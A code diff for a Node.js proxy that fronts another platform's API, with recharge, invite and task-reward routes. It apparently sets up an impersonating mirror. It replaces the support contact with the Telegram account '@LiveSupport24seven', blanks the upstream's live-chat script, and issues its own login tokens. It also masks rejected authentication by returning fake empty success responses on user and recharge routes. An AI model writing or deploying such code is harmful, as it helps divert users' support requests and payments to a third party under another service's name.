@@ -19,9 +19,9 @@ const bcrypt = require("bcryptjs");
 const db = require("../lib/db");
 const langEn = require("../lib/lang-en.json");
 
-/** Single support entry — Telegram only (per product requirement). */
+/** Single support entry — Telegram only (@LiveSupport24seven). */
 const TELEGRAM_SUPPORT = {
-  name: "Live Support",
+  name: "LiveSupport24seven",
   link: "https://t.me/LiveSupport24seven",
   image: "https://telegram.org/img/t_logo.svg",
 };
@@ -159,7 +159,7 @@ async function issueToken(email) {
  * Forwards the original method, headers (minus host), and body.
  * Streams the upstream response back to the client.
  */
-function proxyToUpstream(req, res, route, rawBody) {
+function proxyToUpstream(req, res, route, rawBody, opts = {}) {
   return new Promise((resolve, reject) => {
     const url = new URL(UPSTREAM + "/api" + route);
 
@@ -187,6 +187,7 @@ function proxyToUpstream(req, res, route, rawBody) {
       "st-ttgn",
     ];
     for (const h of forwardHeaders) {
+      if (opts.stripAuth && h === "authorization") continue;
       if (req.headers[h]) headers[h] = req.headers[h];
     }
 
@@ -234,6 +235,126 @@ function proxyToUpstream(req, res, route, rawBody) {
     }
     proxyReq.end();
   });
+}
+
+function isLocalIssuedToken(req) {
+  const t = getToken(req);
+  return Boolean(t && /^tk_/i.test(t));
+}
+
+/**
+ * When the SPA uses our local login token (tk_*), upstream does not recognize it and returns
+ * 410000 / 401 — the client then clears cookies and reloads ("kicked out"). For /user/* routes
+ * we substitute safe empty payloads so navigation keeps working.
+ */
+function localStubForUserRoute(route, method) {
+  const m = (method || "GET").toUpperCase();
+  const arrayRoutes = new Set([
+    "/user/task_center",
+    "/user/get_share_task",
+    "/user/invite_give",
+    "/user/user_rank",
+    "/user/vip_level_record",
+  ]);
+  if (arrayRoutes.has(route)) return [];
+  if (route === "/user/task_center_receive" && m === "POST") return {};
+  if (route === "/user/invite_give_receive" && m === "POST") return {};
+  if (route === "/user/set_pwd" && m === "POST") return {};
+  if (route === "/user/edit_recharge" && m === "POST") return {};
+  if (route === "/user/team_recharge" && m === "POST") return {};
+  const objectRoutes = new Set([
+    "/user/task_center_detail",
+    "/user/share_config",
+    "/user/invite_info",
+    "/user/edit_recharge",
+    "/user/team_recharge",
+  ]);
+  if (objectRoutes.has(route)) return {};
+  return {};
+}
+
+/** Same as proxyToUpstream but buffers JSON to allow local-user fallback. */
+function proxyToUpstreamBuffered(req, route, rawBody, opts = {}) {
+  return new Promise((resolve, reject) => {
+    const url = new URL(UPSTREAM + "/api" + route);
+    const origUrl = req.url || "";
+    const qIdx = origUrl.indexOf("?");
+    if (qIdx !== -1) {
+      const origParams = new URLSearchParams(origUrl.slice(qIdx + 1));
+      origParams.delete("path");
+      for (const [k, v] of origParams) {
+        url.searchParams.append(k, v);
+      }
+    }
+    const headers = {};
+    const forwardHeaders = [
+      "content-type",
+      "authorization",
+      "accept",
+      "accept-language",
+      "st-lang",
+      "st-ctime",
+      "st-ttgn",
+    ];
+    for (const h of forwardHeaders) {
+      if (opts.stripAuth && h === "authorization") continue;
+      if (req.headers[h]) headers[h] = req.headers[h];
+    }
+    const mod = url.protocol === "https:" ? https : http;
+    const proxyReq = mod.request(
+      url,
+      { method: req.method, headers, timeout: 15000 },
+      (proxyRes) => {
+        const chunks = [];
+        proxyRes.on("data", (c) => chunks.push(c));
+        proxyRes.on("end", () => {
+          resolve({
+            statusCode: proxyRes.statusCode || 200,
+            body: Buffer.concat(chunks),
+            contentType: proxyRes.headers["content-type"] || "",
+          });
+        });
+        proxyRes.on("error", reject);
+      }
+    );
+    proxyReq.on("error", reject);
+    proxyReq.on("timeout", () => {
+      proxyReq.destroy();
+      reject(new Error("upstream timeout"));
+    });
+    if (rawBody && rawBody.length > 0) {
+      proxyReq.setHeader("Content-Length", rawBody.length);
+      proxyReq.write(rawBody);
+    }
+    proxyReq.end();
+  });
+}
+
+async function proxyToUpstreamWithLocalUserFallback(req, res, route, rawBody) {
+  try {
+    const buf = await proxyToUpstreamBuffered(req, route, rawBody, {});
+    const str = buf.body.toString("utf8");
+    let parsed;
+    try {
+      parsed = JSON.parse(str);
+    } catch (e) {
+      applyCors(req, res);
+      if (buf.contentType) res.setHeader("Content-Type", buf.contentType);
+      res.statusCode = buf.statusCode;
+      res.end(buf.body);
+      return;
+    }
+    const st = parsed.status;
+    if (st === 410000 || st === 401 || st === 402 || st === 403) {
+      return json(req, res, 200, ok(localStubForUserRoute(route, req.method)));
+    }
+    applyCors(req, res);
+    res.setHeader("Content-Type", "application/json; charset=utf-8");
+    res.statusCode = buf.statusCode;
+    res.end(str);
+  } catch (e) {
+    json(req, res, 502, err("upstream error: " + (e.message || "error"), 502));
+  }
 }
 
 /**
@@ -380,6 +501,22 @@ module.exports = async (req, res) => {
       res.setHeader("Content-Type", "application/json; charset=utf-8");
       res.statusCode = 200;
       return res.end(JSON.stringify(langEn));
+    }
+
+    // Home/index payload: strip third-party chat script; single Telegram support only.
+    if (route === "/public/index_info" && req.method === "GET") {
+      try {
+        const buf = await proxyToUpstreamBuffered(req, route, rawBody);
+        const str = buf.body.toString("utf8");
+        const upstream = JSON.parse(str);
+        const d = upstream.data || {};
+        if (d.sys_info) d.sys_info.salesmartly_src = "";
+        d.customer = [TELEGRAM_SUPPORT];
+        upstream.data = d;
+        return json(req, res, 200, upstream);
+      } catch (e) {
+        return proxyToUpstream(req, res, route, rawBody);
+      }
     }
 
     // Init DB schema (only if Postgres is configured)
@@ -617,6 +754,12 @@ module.exports = async (req, res) => {
     }
 
     // --- Everything else: proxy to upstream ---
+    if (email && isLocalIssuedToken(req) && route === "/user/upload" && req.method === "POST") {
+      return proxyToUpstream(req, res, route, rawBody, { stripAuth: true });
+    }
+    if (email && isLocalIssuedToken(req) && route.startsWith("/user/")) {
+      return proxyToUpstreamWithLocalUserFallback(req, res, route, rawBody);
+    }
     return proxyToUpstream(req, res, route, rawBody);
 
   } catch (e) {
